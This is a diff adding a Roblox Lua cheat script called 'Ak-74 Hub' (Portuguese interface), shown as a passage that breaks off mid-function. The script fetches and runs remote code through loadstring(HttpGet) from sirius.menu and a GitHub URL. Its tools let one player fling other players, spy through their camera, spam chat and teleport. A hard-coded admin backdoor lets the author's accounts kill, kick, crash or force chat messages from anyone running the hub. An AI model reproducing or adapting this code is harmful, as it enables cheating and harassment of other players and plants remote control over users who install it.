@@ -1,0 +1,1031 @@
+local Success, err = pcall(function()
+    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local TextChatService = game:GetService("TextChatService")
+    local TeleportService = game:GetService("TeleportService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Workspace = game:GetService("Workspace")
+    local HttpService = game:GetService("HttpService")
+    local VirtualInputManager = game:GetService("VirtualInputManager")
+    local LP = Players.LocalPlayer
+
+    local BROOKHAVEN_ID = 4924922222
+    local isBrookhaven = (game.PlaceId == BROOKHAVEN_ID)
+
+    local customSpawnCFrame = nil
+    local flyBodyVel = nil
+    local flyBodyGyro = nil
+    local flyActive = false
+    local spinBodyAng = nil
+
+    local function Char() return LP.Character end
+    local function HRP() local c = Char(); return c and c:FindFirstChild("HumanoidRootPart") end
+    local function Hum() local c = Char(); return c and c:FindFirstChildOfClass("Humanoid") end
+
+    local function sendGlobalMessage(txt)
+        pcall(function()
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                local channels = TextChatService.TextChannels
+                if channels and channels:FindFirstChild("RBXGeneral") then
+                    channels.RBXGeneral:SendAsync(txt)
+                end
+            else
+                LP:Chat(txt)
+            end
+        end)
+    end
+
+    local Window = Rayfield:CreateWindow({
+        Name = isBrookhaven and "Ak-74 Hub - Brookhaven Edition" or "Ak-74 Hub - Universal Edition",
+        LoadingTitle = "Carregando Ak-74 Hub...",
+        LoadingSubtitle = "by Ak-74",
+        ConfigurationSaving = { Enabled = false },
+        KeySystem = false,
+        Theme = "Ocean"
+    })
+
+    local MainTab = Window:CreateTab("Main")
+    local TrollTab = Window:CreateTab("Troll")
+    
+    local AvatarTab, HouseTab, MusicTab
+    if isBrookhaven then
+        AvatarTab = Window:CreateTab("Avatar")
+        HouseTab = Window:CreateTab("House")
+        MusicTab = Window:CreateTab("Músicas")
+    end
+
+    local CharacterTab = Window:CreateTab("Personagem")
+    local TpTab = Window:CreateTab("Teleporte")
+    local EspTab = Window:CreateTab("ESP & Visuais")
+    local GlobalChatTab = Window:CreateTab("Chat Global")
+    local NormChatCmdTab = Window:CreateTab("Comandos Chat")
+    local AdminTab = Window:CreateTab("👑Admin")
+
+    local function getPlayerList()
+        local list = {}
+        pcall(function()
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p and p ~= LP then table.insert(list, p.Name) end
+            end
+        end)
+        if #list == 0 then table.insert(list, "Nenhum jogador") end
+        return list
+    end
+
+    local function getTargetPlayer(nameStr)
+        if not nameStr or nameStr == "" then return nil end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p and string.lower(p.Name) == string.lower(nameStr) then return p end
+            if p and string.find(string.lower(p.Name), string.lower(nameStr), 1, true) then return p end
+        end
+        return nil
+    end
+
+    local function equipBrookhavenItem(itemName)
+        pcall(function()
+            local reFolder = ReplicatedStorage:FindFirstChild("RE")
+            if reFolder then
+                if reFolder:FindFirstChild("1Too1l") then
+                    reFolder["1Too1l"]:FireServer("EquipItem", itemName)
+                end
+                if reFolder:FindFirstChild("1Item1s") then
+                    reFolder["1Item1s"]:FireServer("EquipItem", itemName)
+                end
+            end
+        end)
+    end
+
+    local function doRejoin()
+        pcall(function()
+            if #Players:GetPlayers() <= 1 then
+                TeleportService:Teleport(game.PlaceId, LP)
+            else
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
+            end
+        end)
+    end
+
+    local function executeFlingSingle(target)
+        if not target or not target.Character then return end
+        if isBrookhaven then
+            pcall(function()
+                local bp = LP:FindFirstChildOfClass("Backpack")
+                local char = Char()
+                if bp and bp:FindFirstChild("Couch") and not char:FindFirstChild("Couch") then
+                    local keys = {Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four, Enum.KeyCode.Five}
+                    for _, k in ipairs(keys) do
+                        VirtualInputManager:SendKeyEvent(true, k, false, game)
+                        VirtualInputManager:SendKeyEvent(false, k, false, game)
+                        task.wait(0.05)
+                    end
+                end
+
+                local myHRP = HRP()
+                local origCF = myHRP and myHRP.CFrame
+                local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
+                local tHum = target.Character:FindFirstChildOfClass("Humanoid")
+
+                if myHRP and tHRP then
+                    for i = 1, 30 do
+                        myHRP.CFrame = tHRP.CFrame * CFrame.new(math.random(-2,2), 0, math.random(-2,2)) * CFrame.Angles(math.random(0,3), math.random(0,3), math.random(0,3))
+                        myHRP.AssemblyAngularVelocity = Vector3.new(50000, 50000, 50000)
+                        if tHum and (tHum.Sit or tHum:GetState() == Enum.HumanoidStateType.Seated) then
+                            myHRP.CFrame = CFrame.new(0, 99999, 0)
+                            tHRP.CFrame = CFrame.new(0, 99999, 0)
+                            task.wait(0.3)
+                            if origCF then myHRP.CFrame = origCF end
+                            break
+                        end
+                        RunService.Heartbeat:Wait()
+                    end
+                    if origCF then myHRP.CFrame = origCF end
+                end
+            end)
+        else
+            pcall(function()
+                local myHRP = HRP()
+                local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
+                if myHRP and tHRP then
+                    for i = 1, 40 do
+                        myHRP.AssemblyAngularVelocity = Vector3.new(0, 10000, 0)
+                        myHRP.CFrame = tHRP.CFrame * CFrame.new(math.random(-1, 1), 0, math.random(-1, 1))
+                        RunService.Heartbeat:Wait()
+                    end
+                    myHRP.AssemblyLinearVelocity = Vector3.zero
+                    myHRP.AssemblyAngularVelocity = Vector3.zero
+                end
+            end)
+        end
+    end
+
+    local function stopFly()
+        flyActive = false
+        if flyBodyVel then flyBodyVel:Destroy() flyBodyVel = nil end
+        if flyBodyGyro then flyBodyGyro:Destroy() flyBodyGyro = nil end
+        local h = Hum()
+        if h then h.PlatformStand = false end
+    end
+
+    local function startFly(speedVal)
+        stopFly()
+        flyActive = true
+        local hrp = HRP()
+        local hum = Hum()
+        if not hrp or not hum then return end
+
+        hum.PlatformStand = true
+
+        flyBodyVel = Instance.new("BodyVelocity")
+        flyBodyVel.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+        flyBodyVel.Velocity = Vector3.zero
+        flyBodyVel.Parent = hrp
+
+        flyBodyGyro = Instance.new("BodyGyro")
+        flyBodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+        flyBodyGyro.CFrame = hrp.CFrame
+        flyBodyGyro.Parent = hrp
+
+        task.spawn(function()
+            while flyActive do
+                local currentHRP = HRP()
+                local currentHum = Hum()
+                if not currentHRP or not currentHum then break end
+
+                local camCF = Workspace.CurrentCamera.CFrame
+                flyBodyGyro.CFrame = camCF
+
+                local moveDir = currentHum.MoveDirection
+                if moveDir.Magnitude > 0 then
+                    local flatLook = Vector3.new(camCF.LookVector.X, 0, camCF.LookVector.Z)
+                    flatLook = flatLook.Magnitude > 0.001 and flatLook.Unit or Vector3.zero
+
+                    local flatRight = Vector3.new(camCF.RightVector.X, 0, camCF.RightVector.Z)
+                    flatRight = flatRight.Magnitude > 0.001 and flatRight.Unit or Vector3.zero
+
+                    local forward = moveDir:Dot(flatLook)
+                    local right = moveDir:Dot(flatRight)
+                    local flyDir = (camCF.LookVector * forward) + (camCF.RightVector * right)
+
+                    if flyDir.Magnitude > 0 then
+                        flyBodyVel.Velocity = flyDir.Unit * speedVal
+                    else
+                        flyBodyVel.Velocity = Vector3.zero
+                    end
+                else
+                    flyBodyVel.Velocity = Vector3.zero
+                end
+
+                RunService.RenderStepped:Wait()
+            end
+        end)
+    end
+
+    local function stopSpin()
+        if spinBodyAng then spinBodyAng:Destroy() spinBodyAng = nil end
+    end
+
+    local function startSpin(speedVal)
+        stopSpin()
+        local hrp = HRP()
+        if not hrp then return end
+        local spd = tonumber(speedVal) or 20
+        if spd == 0 then return end
+
+        spinBodyAng = Instance.new("BodyAngularVelocity")
+        spinBodyAng.MaxTorque = Vector3.new(0, 9e9, 0)
+        spinBodyAng.AngularVelocity = Vector3.new(0, spd, 0)
+        spinBodyAng.Parent = hrp
+    end
+
+    LP.CharacterAdded:Connect(function(char)
+        stopFly()
+        stopSpin()
+        task.wait(0.5)
+        if customSpawnCFrame and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.CFrame = customSpawnCFrame
+        end
+    end)
+
+    MainTab:CreateSection("Geral")
+    MainTab:CreateButton({
+        Name = "!Rejoin",
+        Callback = function() doRejoin() end,
+    })
+
+    MainTab:CreateButton({
+        Name = "Copiar Discord",
+        Callback = function()
+            if setclipboard then
+                setclipboard("https://discord.gg/gj2cGaVdQ")
+                Rayfield:Notify({Title = "Sucesso", Content = "Discord copiado!", Duration = 3})
+            end
+        end,
+    })
+
+    local spamText = "Ak-74 Hub"
+    MainTab:CreateInput({
+        Name = "Texto do Spam",
+        PlaceholderText = "Digite o texto...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(Value) spamText = Value end,
+    })
+
+    MainTab:CreateButton({
+        Name = "!Executar Spam 7x",
+        Callback = function()
+            task.spawn(function()
+                for i = 1, 7 do
+                    sendGlobalMessage(spamText)
+                    task.wait(0.5)
+                end
+            end)
+        end,
+    })
+
+    TrollTab:CreateSection("Controle de Troll & Fling")
+    local selectedTarget = "Nenhum jogador"
+
+    local DropdownTroll = TrollTab:CreateDropdown({
+        Name = "Selecionar Vítima",
+        Options = getPlayerList(),
+        CurrentOption = "Nenhum jogador",
+        Callback = function(Option) selectedTarget = Option[1] or Option end,
+    })
+
+    TrollTab:CreateButton({
+        Name = "Atualizar Lista",
+        Callback = function() DropdownTroll:Refresh(getPlayerList()) end,
+    })
+
+    local viewActive = false
+    TrollTab:CreateToggle({
+        Name = "View (Invadir Câmera)",
+        CurrentValue = false,
+        Callback = function(Value)
+            viewActive = Value
+            task.spawn(function()
+                while viewActive do
+                    pcall(function()
+                        local target = getTargetPlayer(selectedTarget)
+                        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
+                            Workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
+                        else
+                            Workspace.CurrentCamera.CameraSubject = Hum()
+                        end
+                    end)
+                    RunService.RenderStepped:Wait()
+                end
+                Workspace.CurrentCamera.CameraSubject = Hum()
+            end)
+        end,
+    })
+
+    local normalFlingActive = false
+    TrollTab:CreateToggle({
+        Name = "Fling Normal",
+        CurrentValue = false,
+        Callback = function(Value)
+            normalFlingActive = Value
+            task.spawn(function()
+                while normalFlingActive do
+                    pcall(function()
+                        local target = getTargetPlayer(selectedTarget)
+                        if target then executeFlingSingle(target) end
+                    end)
+                    RunService.Heartbeat:Wait()
+                end
+            end)
+        end,
+    })
+
+    local flingAllActive = false
+    TrollTab:CreateToggle({
+        Name = "Fling All",
+        CurrentValue = false,
+        Callback = function(Value)
+            flingAllActive = Value
+            task.spawn(function()
+                while flingAllActive do
+                    pcall(function()
+                        for _, p in ipairs(Players:GetPlayers()) do
+                            if p and p ~= LP then executeFlingSingle(p) end
+                        end
+                    end)
+                    RunService.Heartbeat:Wait()
+                end
+            end)
+        end,
+    })
+
+    if isBrookhaven then
+        TrollTab:CreateSection("Brookhaven")
+
+        local couchFlingActive = false
+        TrollTab:CreateToggle({
+            Name = "Fling Couch",
+            CurrentValue = false,
+            Callback = function(Value)
+                couchFlingActive = Value
+                if couchFlingActive then
+                    task.spawn(function()
+                        while couchFlingActive do
+                            local target = getTargetPlayer(selectedTarget)
+                            if target then executeFlingSingle(target) end
+                            RunService.Heartbeat:Wait()
+                        end
+                    end)
+                end
+            end,
+        })
+        TrollTab:CreateParagraph({Title = "Info Couch", Content = "pegar couch manualmente, pois n consigo arrumar essa porr#"})
+
+        TrollTab:CreateButton({
+            Name = "Bus - n funciona",
+            Callback = function() Rayfield:Notify({Title = "Aviso", Content = "Bus n funciona.", Duration = 3}) end,
+        })
+
+        TrollTab:CreateButton({
+            Name = "Guincho - n funciona",
+            Callback = function() Rayfield:Notify({Title = "Aviso", Content = "Guincho n funciona.", Duration = 3}) end,
+        })
+    end
+
+    if isBrookhaven then
+        AvatarTab:CreateSection("Avatar")
+        AvatarTab:CreateParagraph({Title = "Info", Content = "nd por enquanto.."})
+
+        HouseTab:CreateSection("Casa")
+        HouseTab:CreateParagraph({Title = "Info", Content = "nd por enquanto.."})
+
+        MusicTab:CreateSection("Boombox")
+        local musicIdInput = ""
+        MusicTab:CreateInput({
+            Name = "ID da Música",
+            PlaceholderText = "Ex: 18483545",
+            RemoveTextAfterFocusLost = false,
+            Callback = function(Value) musicIdInput = Value end,
+        })
+
+        MusicTab:CreateButton({
+            Name = "tocar 1 (caso não funcione o Tocar 2)",
+            Callback = function()
+                pcall(function()
+                    local idNum = tonumber(musicIdInput)
+                    if not idNum then
+                        Rayfield:Notify({Title = "Erro", Content = "Digite um ID de música válido!", Duration = 3})
+                        return
+                    end
+                    equipBrookhavenItem("BoomBox")
+                    task.wait(0.3)
+                    local re = ReplicatedStorage:FindFirstChild("RE")
+                    if re and re:FindFirstChild("1Music1") then
+                        re["1Music1"]:FireServer(idNum)
+                        Rayfield:Notify({Title = "Boombox", Content = "Música enviada!", Duration = 3})
+                    end
+                end)
+            end,
+        })
+
+        MusicTab:CreateButton({
+            Name = "tocar 2 (caso não funcione o Tocar 1)",
+            Callback = function()
+                pcall(function()
+                    local idNum = tonumber(musicIdInput)
+                    if not idNum then
+                        Rayfield:Notify({Title = "Erro", Content = "Digite um ID de música válido!", Duration = 3})
+                        return
+                    end
+                    equipBrookhavenItem("BoomBox")
+                    task.wait(0.3)
+                    local char = Char()
+                    local backpack = LP:FindFirstChildOfClass("Backpack")
+                    local tool = (char and char:FindFirstChild("Boombox")) or (char and char:FindFirstChild("BoomBox")) or (backpack and backpack:FindFirstChild("Boombox")) or (backpack and backpack:FindFirstChild("BoomBox"))
+                    
+                    if tool then
+                        local remote = tool:FindFirstChild("Remote") or tool:FindFirstChild("RemoteEvent") or tool:FindFirstChildOfClass("RemoteEvent")
+                        if remote then
+                            remote:FireServer(idNum)
+                            Rayfield:Notify({Title = "Boombox", Content = "Música acionada na Tool!", Duration = 3})
+                        end
+                    end
+                end)
+            end,
+        })
+    end
+
+    CharacterTab:CreateSection("Personagem")
+    CharacterTab:CreateToggle({
+        Name = "Fly Menu",
+        CurrentValue = false,
+        Callback = function(Value)
+            if Value then
+                pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/MobileFly.lua"))() end)
+            else
+                stopFly()
+            end
+        end,
+    })
+
+    CharacterTab:CreateButton({
+        Name = "Curar",
+        Callback = function() local h = Hum(); if h then h.Health = h.MaxHealth end end,
+    })
+
+    TpTab:CreateSection("Teleporte")
+    TpTab:CreateButton({
+        Name = "TP Tool",
+        Callback = function()
+            pcall(function()
+                local bp = LP:FindFirstChildOfClass("Backpack")
+                if not bp then return end
+                local t = Instance.new("Tool")
+                t.Name = "TP Tool"
+                t.RequiresHandle = false
+                t.Activated:Connect(function()
+                    pcall(function()
+                        local mouse = LP:GetMouse()
+                        local hrp = HRP()
+                        if hrp and mouse and mouse.Hit then 
+                            hrp.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0)) 
+                        end
+                    end)
+                end)
+                t.Parent = bp
+            end)
+        end,
+    })
+
+    EspTab:CreateSection("Visuais")
+    local espActive = false
+    local espStorage = {}
+
+    EspTab:CreateToggle({
+        Name = "ESP Completo",
+        CurrentValue = false,
+        Callback = function(Value)
+            espActive = Value
+            for _, v in pairs(espStorage) do if v then v:Destroy() end end
+            espStorage = {}
+            if not espActive then return end
+            task.spawn(function()
+                while espActive do
+                    pcall(function()
+                        for _, p in ipairs(Players:GetPlayers()) do
+                            if p and p ~= LP and p.Character then
+                                local model = p.Character
+                                local head = model:FindFirstChild("Head") or model:FindFirstChildOfClass("BasePart")
+                                if head and not model:FindFirstChild("AkESP") then
+                                    local bb = Instance.new("BillboardGui")
+                                    bb.Name = "AkESP"
+                                    bb.Adornee = head
+                                    bb.Size = UDim2.new(0, 200, 0, 50)
+                                    bb.StudsOffset = Vector3.new(0, 2.5, 0)
+                                    bb.AlwaysOnTop = true
+                                    local txt = Instance.new("TextLabel")
+                                    txt.Size = UDim2.new(1, 0, 1, 0)
+                                    txt.BackgroundTransparency = 1
+                                    txt.TextColor3 = Color3.fromRGB(0, 255, 150)
+                                    txt.TextStrokeTransparency = 0
+                                    txt.TextSize = 12
+                                    txt.Text = p.Name
+                                    txt.Parent = bb
+                                    bb.Parent = head
+                                    table.insert(espStorage, bb)
+                                end
+                            end
+                        end
+                    end)
+                    task.wait(2)
+                end
+            end)
+        end,
+    })
+
+    GlobalChatTab:CreateSection("Transmissão Global")
+    local globalMsgInput = "Ak-74 Hub Global"
+    GlobalChatTab:CreateInput({
+        Name = "Mensagem",
+        PlaceholderText = "Digite a mensagem...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(Value) globalMsgInput = Value end,
+    })
+
+    GlobalChatTab:CreateButton({
+        Name = "Enviar",
+        Callback = function()
+            sendGlobalMessage(globalMsgInput)
+            Rayfield:Notify({Title = "Chat Global", Content = "Mensagem enviada!", Duration = 3})
+        end,
+    })
+
+    NormChatCmdTab:CreateSection("Comandos de Chat Normais")
+    NormChatCmdTab:CreateParagraph({
+        Title = "Lista de Comandos Disponíveis",
+        Content = "!fly [1-10] - Voo por velocidade (1=10, 2=20, 10=100)\n!speed [valor] - Altera velocidade\n!jp / !jumppower [valor] - Altera pulo\n!view [nick] - Observa jogador\n!tpto [nick] - Teleporta até jogador\n!fling [nick] - Fling no alvo\n!fling all - Fling in todos\n!reset - Reseta seu personagem\n!spawnpoint / !spawn - Salva ponto de nascimento\n!sus [nick] - Emote nas costas do alvo\n!serverhop / !shop - Salta de servidor\n!lowserver / !low - Vai para servidor vazio\n!sla - Encerra o script"
+    })
+
+    AdminTab:CreateSection("Painel Administrativo (Botões Clicáveis)")
+
+    local function isAdminPlayer(p)
+        if not p then return false end
+        return p.UserId == 11897042146 or p.UserId == 11706636038 or p.Name == "Ak_74OutraConta" or p.Name == "MR_banguela2"
+    end
+
+    local function hasAdminAccess()
+        return isAdminPlayer(LP)
+    end
+    LP:SetAttribute("AkHubActive", true)
+
+    local adminTargetInput = ""
+    AdminTab:CreateInput({
+        Name = "Nick do Alvo",
+        PlaceholderText = "Digite parte do nick...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(Value) adminTargetInput = Value end,
+    })
+
+    local function isHubUser(player)
+        if not player then return false end
+        local successAttr, attrVal = pcall(function() return player:GetAttribute("AkHubActive") end)
+        return (successAttr and attrVal == true) or player.Name == "Ak_74OutraConta" or player.Name == "MR_banguela2"
+    end
+
+    AdminTab:CreateButton({
+        Name = "!Verify",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local found = {}
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if isHubUser(p) then table.insert(found, p.Name) end
+                end
+                Rayfield:Notify({Title = "Verificação", Content = #found > 0 and table.concat(found, ", ") or "Nenhum user encontrado", Duration = 4})
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Kill",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!kill " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    local kickReason = "Abuso"
+    AdminTab:CreateInput({
+        Name = "Motivo Kick",
+        PlaceholderText = "Motivo...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(Value) kickReason = Value end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Kick",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!kick " .. t.Name .. " " .. kickReason)
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Bring",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!bring " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Flyplayer",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!flyplayer " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Unflyplayer",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!unflyplayer " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    local spinSpeedInput = "20"
+    AdminTab:CreateInput({
+        Name = "Velocidade Spin",
+        PlaceholderText = "Digite a velocidade...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(Value) spinSpeedInput = Value end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Spinplayer",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    local spd = tonumber(spinSpeedInput) or 20
+                    sendGlobalMessage("!spinplayer " .. t.Name .. " " .. tostring(spd))
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Unspinplayer",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!unspinplayer " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Crashar",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!crashar " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "!Rjplayer",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!rjplayer " .. t.Name)
+                end
+            end)
+        end,
+    })
+
+    local controllChatActive = false
+    local controllChatConn = nil
+    AdminTab:CreateToggle({
+        Name = "!ControllChat",
+        CurrentValue = false,
+        Callback = function(Value)
+            controllChatActive = Value
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                if controllChatConn then controllChatConn:Disconnect() controllChatConn = nil end
+                if controllChatActive then
+                    Rayfield:Notify({Title = "ControllChat", Content = "Ativado!", Duration = 3})
+                    local target = getTargetPlayer(adminTargetInput)
+                    if target then
+                        controllChatConn = target.Chatted:Connect(function(msg)
+                            if controllChatActive then
+                                Rayfield:Notify({Title = "Chat de " .. target.Name, Content = msg, Duration = 5})
+                            end
+                        end)
+                    end
+                else
+                    Rayfield:Notify({Title = "ControllChat", Content = "Desativado.", Duration = 3})
+                end
+            end)
+        end,
+    })
+
+    local forcedChatMessage = "Ak-74 Hub Dominou!"
+    AdminTab:CreateInput({
+        Name = "Mensagem Forçada",
+        PlaceholderText = "Digite o que o alvo vai falar...",
+        RemoveTextAfterFocusLost = false,
+        Callback = function(Value) forcedChatMessage = Value end,
+    })
+
+    AdminTab:CreateButton({
+        Name = "Forçar Mensagem (!controllchat)",
+        Callback = function()
+            pcall(function()
+                if not hasAdminAccess() then Rayfield:Notify({Title = "Acesso Negado", Content = "Sem permissão!", Duration = 3}) return end
+                local t = getTargetPlayer(adminTargetInput)
+                if t and isHubUser(t) then
+                    sendGlobalMessage("!controllchat " .. t.Name .. " " .. forcedChatMessage)
+                end
+            end)
+        end,
+    })
+
+    AdminTab:CreateSection("Comandos de Chat Exclusivos para Admin")
+    AdminTab:CreateParagraph({
+        Title = "Comandos via Chat de Admin",
+        Content = "!kill [nick] - Mata o usuário do Hub\n!kick [nick] [motivo] - Expulsa o usuário do jogo\n!bring [nick] - Puxa o usuário até você\n!flyplayer [nick] - Faz o usuário do Hub voar\n!unflyplayer [nick] - Para o voo do usuário\n!spinplayer [nick] [velocidade] - Faz o usuário girar\n!unspinplayer [nick] - Para o giro do usuário\n!controllchat [nick] [mensagem] - Faz o usuário falar no chat\n!crashar [nick] - Congela e desconecta o alvo do servidor\n!rjplayer [nick] - Força a reconexão/rejoin no alvo"
+    })
+
+    local function processChatCommand(sender, message)
+        pcall(function()
+            local args = string.split(message, " ")
+            local cmd = string.lower(args[1] or "")
+
+            if sender == LP then
+                if cmd == "!fly" then
+                    if not args[2] or tonumber(args[2]) ~= nil then
+                        local num = tonumber(args[2]) or 1
+                        startFly(num * 10)
+                    end
+                elseif cmd == "!unfly" then
+                    if not args[2] or tonumber(args[2]) ~= nil then
+                        stopFly()
+                    end
+                elseif cmd == "!spin" then
+                    if not args[2] or tonumber(args[2]) ~= nil then
+                        local spd = tonumber(args[2]) or 20
+                        startSpin(spd)
+                    end
+                elseif cmd == "!unspin" then
+                    if not args[2] or tonumber(args[2]) ~= nil then
+                        stopSpin()
+                    end
+                elseif cmd == "!speed" then
+                    local spd = tonumber(args[2]) or 16
+                    local h = Hum()
+                    if h then h.WalkSpeed = spd end
+                elseif cmd == "!jp" or cmd == "!jumppower" then
+                    local jp = tonumber(args[2]) or 50
+                    local h = Hum()
+                    if h then h.UseJumpPower = true h.JumpPower = jp end
+                elseif cmd == "!view" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t.Character and t.Character:FindFirstChild("Humanoid") then
+                        Workspace.CurrentCamera.CameraSubject = t.Character.Humanoid
+                    end
+                elseif cmd == "!unview" then
+                    Workspace.CurrentCamera.CameraSubject = Hum()
+                elseif cmd == "!tpto" then
+                    local t = getTargetPlayer(args[2] or "")
+                    local myHRP = HRP()
+                    if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") and myHRP then
+                        myHRP.CFrame = t.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+                    end
+                elseif cmd == "!fling" then
+                    if args[2] == "all" then
+                        for _, p in ipairs(Players:GetPlayers()) do
+                            if p ~= LP then executeFlingSingle(p) end
+                        end
+                    else
+                        local t = getTargetPlayer(args[2] or "")
+                        if t then executeFlingSingle(t) end
+                    end
+                elseif cmd == "!reset" then
+                    local h = Hum()
+                    if h then h.Health = 0 end
+                elseif cmd == "!spawnpoint" or cmd == "!spawn" then
+                    local myHRP = HRP()
+                    if myHRP then
+                        customSpawnCFrame = myHRP.CFrame
+                        Rayfield:Notify({Title = "Spawn", Content = "Ponto salvo!", Duration = 3})
+                    end
+                elseif cmd == "!sus" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                        pcall(function()
+                            local animate = Char():FindFirstChild("Animate")
+                            if animate then
+                                local dance = animate:FindFirstChild("dance")
+                                if dance then
+                                    local track = dance:FindFirstChildOfClass("Animation")
+                                    if track then track.AnimationId = "rbxassetid://5938365243" end
+                                end
+                            end
+                        end)
+                        local myHRP = HRP()
+                        if myHRP then
+                            myHRP.CFrame = t.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.2)
+                        end
+                    end
+                elseif cmd == "!serverhop" or cmd == "!shop" then
+                    pcall(function()
+                        local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
+                        for _, s in ipairs(servers) do
+                            if s.id ~= game.JobId and s.playing < s.maxPlayers then
+                                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LP)
+                                break
+                            end
+                        end
+                    end)
+                elseif cmd == "!lowserver" or cmd == "!low" then
+                    pcall(function()
+                        local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
+                        table.sort(servers, function(a, b) return a.playing < b.playing end)
+                        for _, s in ipairs(servers) do
+                            if s.id ~= game.JobId and s.playing > 0 then
+                                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LP)
+                                break
+                            end
+                        end
+                    end)
+                elseif cmd == "!sla" then
+                    Rayfield:Destroy()
+                end
+            end
+
+            if isAdminPlayer(sender) and isHubUser(LP) then
+                if cmd == "!kill" or cmd == "_kill" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        local h = Hum()
+                        if h then h.Health = 0 end
+                    end
+                elseif cmd == "!kick" then
+                    local t = getTargetPlayer(args[2] or "")
+                    if t and t == LP then
+                        local reason = table.concat(args, " ", 3)
+                        if not reason or reason == "" then reason = "Abuso" end
+                        LP:Kick("Expulsado do Hub: " .. reason)
+                    end
+                elseif cmd == "!bring" or cmd == "_bring" then
+                    local t = getTargetPlayer(args[2] or "")
